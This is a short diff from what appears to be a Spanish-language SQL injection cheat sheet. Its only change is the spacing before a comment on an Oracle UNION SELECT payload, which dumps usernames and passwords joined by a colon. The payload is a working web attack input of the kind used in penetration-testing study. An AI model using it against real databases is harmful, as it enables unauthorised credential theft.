@@ -138,7 +138,7 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 ```bash 
 # ORACLE
 
-❯ ' union select username||':'||password from ❮Table_Name❯-- -                   # Para que nos muestre los datos de los usuarios y su passwd separados por : 
+❯ ' union select username||':'||password from ❮Table_Name❯-- -                    # Para que nos muestre los datos de los usuarios y su passwd separados por : 
 ```
 
 ## Inyecciones Blind con respuesta condicional 
